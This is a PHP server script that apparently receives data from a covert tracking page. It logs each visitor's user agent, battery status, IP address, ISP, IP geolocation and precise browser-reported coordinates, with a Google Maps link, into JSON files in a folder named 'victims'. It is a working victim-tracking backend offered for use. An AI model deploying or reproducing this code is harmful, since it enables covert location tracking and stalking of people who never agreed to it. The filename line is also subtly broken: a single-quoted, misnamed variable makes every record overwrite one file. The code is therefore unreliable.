<?php
  header("Access-Control-Allow-Origin: *");
  header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
  header("Access-Control-Allow-Headers: Content-Type");

  $json = file_get_contents('php://input');
  $jsondata = json_decode($json, true);
  $batdata = $jsondata['battery'] ?? null;

  $ip = $_SERVER['HTTP_CF_CONNECTING_IP']
      ?? $_SERVER['HTTP_X_FORWARDED_FOR']
      ?? $_SERVER['REMOTE_ADDR']
      ?? 'unknown';

  if (strpos($ip, ',') !== false) {
    $ip = trim(explode(',', $ip)[0]);
  }

  $data = [];
  $ch = curl_init("http://ip-api.com/json/" . urlencode($ip));
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_TIMEOUT, 5);
  $response = curl_exec($ch);
  curl_close($ch);
  if ($response) {
    $data = json_decode($response, true) ?? [];
  }

  $lat = isset($jsondata['location']['lat']) ? $jsondata['location']['lat'] : ($data['lat'] ?? null);
  $lon = isset($jsondata['location']['lon']) ? $jsondata['location']['lon'] : ($data['lon'] ?? null);

  $info = array(
    "UserAgent"    => $jsondata['ua'] ?? 'N/A',
    "BatteryLevel" => $batdata['level'] ?? 'N/A',
    "ChargingStatus" => $batdata['charging'] ?? 'N/A',
    "IP"           => $data['query'] ?? $ip,
    "Country"      => $data['country'] ?? 'N/A',
    "CountryCode"  => $data['countryCode'] ?? 'N/A',
    "City"         => $data['city'] ?? 'N/A',
    "Region"       => $data['regionName'] ?? 'N/A',
    "RegionCode"   => $data['region'] ?? 'N/A',
    "Latitude"     => $lat ?? 'N/A',
    "Longitude"    => $lon ?? 'N/A',
    "Maps"         => ($lat && $lon) ? "https://www.google.com/maps?q=" . $lat . "," . $lon : 'N/A',
    "PostalCode"   => $data['zip'] ?? 'N/A',
    "CountryFlag"  => isset($data['countryCode']) ? "https://www.countryflags.io/" . $data['countryCode'] . "/flat/64.png" : 'N/A',
    "ASN"          => $data['as'] ?? 'N/A',
    "ORG"          => $data['org'] ?? 'N/A',
    "ISP"          => $data['isp'] ?? 'N/A',
    "UTC"          => $data['timezone'] ?? 'N/A',
    "CurrentTime"  => date('Y-m-d H:i:s')
  );

  $uniqueId = uniqid('', true);

  $infosDir = "./victims/infos";
  $filepath  = $infosDir . '/victim_{$unique_id}.json';

  if (!file_exists($infosDir)) {
    mkdir($infosDir, 0755, true);
  }

  file_put_contents($filepath, json_encode($info, JSON_PRETTY_PRINT));
?>
